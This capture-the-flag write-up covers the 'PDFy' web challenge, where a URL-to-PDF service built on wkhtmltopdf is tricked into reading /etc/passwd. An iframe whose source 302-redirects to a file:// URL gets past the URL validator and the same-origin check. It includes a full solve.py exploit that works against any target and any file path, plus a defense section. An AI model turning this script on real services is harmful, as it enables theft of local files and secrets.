## Overview

PDFy is an Easy Web challenge built around a "paste a URL, get a PDF" service. The
goal is stated up front: *leak `/etc/passwd` to get the flag*. The whole solve is a
single [server-side request forgery](https://cwe.mitre.org/data/definitions/918.html)
that becomes a **local file read**, because the PDF is rendered by an old engine
(`wkhtmltopdf` / QtWebKit) that happily loads `file://` resources. Two filters try to
stop us, and one neat redirect trick walks past both.

## The technique

You submit a URL; the server fetches that page and returns it as a PDF. The backend
shells out to **wkhtmltopdf 0.12.5**, built on **QtWebKit (Qt 4.8.7)** — and we know
that because a malformed input made the app echo its own command:

```
Error generating PDF: Command '['wkhtmltopdf', '--margin-top', '0', ..., '<url>', 'out.pdf']' returned non-zero exit status 1.
```

Legacy renderers like this load `file://` resources **by default** (there's no
`--disable-local-file-access` in that command line). So if we can get the rendered page
to reference `file:///etc/passwd`, its contents are painted into the PDF. The two guards:

1. **URL validator** — submitting `file:///etc/passwd` directly is rejected as
   `Malformed url` (the app parses the URL and demands a host; `file://` has none).
2. **Same-origin policy** — hosting an HTML page with `<iframe src="file:///etc/passwd">`
   also fails: QtWebKit refuses to let an `https` page frame a `file://` document.

The bypass: QtWebKit only enforces the framing SOP check against the iframe's **initial
`src`**. If that `src` is an allowed `http(s)` URL that then **302-redirects to `file://`**,
the engine follows the cross-protocol redirect and renders the local file anyway.

## Solution

We need an outer HTML page (hosted on something the target can reach) whose iframe points
at a public redirector that 302s to `file://`:

- Redirector: `https://httpbin.org/redirect-to?url=file:///etc/passwd&status_code=302`
  (httpbin echoes an arbitrary `Location:` header).
- Outer page host: [webhook.site](https://webhook.site) — its API lets us configure a
  default response that serves our iframe HTML, and the URL is publicly reachable by the
  challenge container, so no tunnel is needed.

`solve.py`:

```python
#!/usr/bin/env python3
import sys, json, urllib.request, subprocess, re

TARGET   = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1:1337"
LOOTFILE = sys.argv[2] if len(sys.argv) > 2 else "/etc/passwd"

PAYLOAD = ('<html><body><iframe src="https://httpbin.org/redirect-to?'
           f'url=file://{LOOTFILE}&status_code=302" '
           'style="width:1600px;height:1900px;border:0"></iframe></body></html>')

def post(url, data):
    r = urllib.request.Request(url, data=data.encode(),
                               headers={"Content-Type": "application/json"})
    return urllib.request.urlopen(r, timeout=60).read()

tok = json.loads(post("https://webhook.site/token",
        json.dumps({"default_status":200, "default_content":PAYLOAD,
                    "default_content_type":"text/html"})))
hook = "https://webhook.site/" + tok["uuid"]

res = json.loads(post(f"http://{TARGET}/api/cache", json.dumps({"url": hook})))
fn  = res["filename"]

pdf = urllib.request.urlopen(f"http://{TARGET}/static/pdfs/{fn}", timeout=30).read()
open("loot.pdf","wb").write(pdf)
txt = subprocess.run(["pdftotext","-layout","loot.pdf","-"],
                     capture_output=True, text=True).stdout
print(txt)
print("[+] FLAG:", (re.search(r"HTB\{[^}]+\}", txt) or ["not found"])[0])
```

Run it against the instance:

```bash
python3 solve.py <host:port>
```

The rendered `/etc/passwd` comes back in the PDF, and the flag is sitting in the GECOS
(comment) field of a `flaguser` line:

```
flaguser:x:1001:1001:HTB{...},,,:/home/flaguser:/bin/bash
```

## Why it worked

- **wkhtmltopdf loads `file://` by default**, so its SSRF primitive doubles as arbitrary
  local file read.
- **The validator only inspects the submitted URL**, never the redirect chain — so an
  allowed `http(s)` URL that later redirects to `file://` sails through.
- **QtWebKit checks the framing same-origin policy on the iframe's initial `src`, not on
  the document after a redirect** — so the `http → file` hop inside the frame is honoured.

## Fix / defense

- Run the renderer with `--disable-local-file-access` and an `http,https`-only protocol allow-list.
- Re-validate the URL **after every redirect**; reject any hop whose scheme isn't http/https.
- Render in a network-isolated, least-privilege sandbox with no secrets readable and no egress.
- Replace end-of-life engines (wkhtmltopdf / PhantomJS / QtWebKit) with a sandboxed,
  up-to-date headless Chromium.
